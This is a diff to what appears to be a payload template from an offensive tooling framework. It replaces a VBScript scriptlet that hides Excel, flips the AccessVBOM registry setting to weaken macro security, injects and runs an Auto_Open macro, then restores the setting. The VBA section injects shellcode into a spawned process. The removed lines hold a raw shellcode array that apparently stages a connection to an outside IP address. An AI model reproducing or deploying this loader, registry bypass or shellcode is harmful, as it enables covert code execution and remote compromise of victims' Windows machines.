@@ -19,60 +19,81 @@ value: notSet
 [ClassID]
 value: notSet
 
-[PreserveWhitespace]
-value: True
-
 [Template]
-data:	`<?XML version="1.0"?>
-	`	<scriptlet>
-	`		<registration progid="41632f" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
-	`			<script language="vbscript">
-	`			<![CDATA[
-	`				Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
-	`
-	`	Set objExcel = CreateObject("Excel.Application")
-	`	objExcel.Visible = False
-	`	
-	`	Set WshShell = CreateObject("Wscript.Shell")
-	`	
-	`	function RegExists(regKey)
-	`		on error resume next
-	`		WshShell.RegRead regKey
-	`		RegExists = (Err.number = 0)
-	`	end function
-	`	
-	`	' Get the old AccessVBOM value
-	`	RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"
-	`
-	`	if RegExists(RegPath) then
-	`		action = WshShell.RegRead(RegPath)
-	`	else
-	`		action = ""
-	`	end if
-	`	
-	`	' Weaken the target
-	`	WshShell.RegWrite RegPath, 1, "REG_DWORD"
-	`	
-	`	' Run the macro
-	`	Set objWorkbook = objExcel.Workbooks.Add()
-	`	Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
-	`	xlmodule.CodeModule.AddFromString ${Processing:value}
-	`			objExcel.DisplayAlerts = False
-	`			on error resume next
-	`			objExcel.Run "Auto_Open"
-	`			objWorkbook.Close False
-	`			objExcel.Quit
-	`
-	`			' Restore the registry to its old state
-	`			if action = "" then
-	`				WshShell.RegDelete RegPath
-	`			else
-	`				WshShell.RegWrite RegPath, action, "REG_DWORD"
-	`			end if
-	`					]]>
-	`				</script>
-	`			</registration>
-	`		</scriptlet>"""	
+data:	<?XML version="1.0"?>
+		<scriptlet>
+		<registration 
+		    progid="newTest"
+		    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+			<!-- Proof Of Concept - Casey Smith @subTee -->
+			<!--  License: BSD3-Clause -->
+			<script language="VBScript">
+				<![CDATA[	
+					Function Register
+						MsgBox " - Windows Script Component registered."
+					End Function
+				]]>
+			</script>
+		</registration>
+
+		<public>
+			<method name="Test"></method>
+			<method name="RegExists">
+				<parameter name="regKey"/>
+			</method>
+		</public>
+
+		<script language="VBScript">
+			<![CDATA[	
+
+			Function Test()
+
+					Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
+
+		Set objExcel = CreateObject("Excel.Application")
+		objExcel.Visible = False
+
+		Set WshShell = CreateObject("Wscript.Shell")
+
+		' Get the old AccessVBOM value
+		RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"
+
+		if RegExists(RegPath) then
+			action = WshShell.RegRead(RegPath)
+		else
+			action = ""
+		end if
+
+		' Weaken the target
+		WshShell.RegWrite RegPath, 1, "REG_DWORD"
+
+		' Run the macro
+		Set objWorkbook = objExcel.Workbooks.Add()
+		Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
+		xlmodule.CodeModule.AddFromString ${Processing:value}
+		objExcel.DisplayAlerts = False
+		on error resume next
+		objExcel.Run "Auto_Open"
+		objWorkbook.Close False
+		objExcel.Quit
+
+		' Restore the registry to its old state
+		if action = "" then
+			WshShell.RegDelete RegPath
+		else
+			WshShell.RegWrite RegPath, action, "REG_DWORD"
+		end if
+			
+			End Function
+			
+			Function RegExists(regKey)
+				on error resume next
+				WshShell.RegRead regKey
+				RegExists = (Err.number = 0)
+			End function
+			]]>
+		</script>
+		</scriptlet>
 
 [Processing]
 value: Private Type PROCESS_INFORMATION
@@ -127,23 +148,7 @@ value: Private Type PROCESS_INFORMATION
 	#Else
 	    Dim rwxpage As Long, res As Long
 	#End If
-	    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _
-	60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _
-	80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _
-	125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _
-	91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-	-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
-	83,73,69,32,56,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,84,114,105,100,101,110,116, _
-	47,52,46,48,59,32,73,110,102,111,80,97,116,104,46,50,59,32,46,78,69,84,52,46,48,67,59,32,46,78,69,84, _
-	52,46,48,69,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _
-	88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _
-	104,80,0,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _
-	-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _
-	-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _
-	11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,50,117,73,108,0,0,104,-16, _
-	-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _
-	0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _
-	49,51,56,46,49,57,55,46,49,50,46,49,54,0)
+	    myArray = ${ShellCode:value}
 	    If Len(Environ("ProgramW6432")) > 0 Then
 		sProc = Environ("windir") & "\\SysWOW64\\${Processx64:value}"
 	    Else
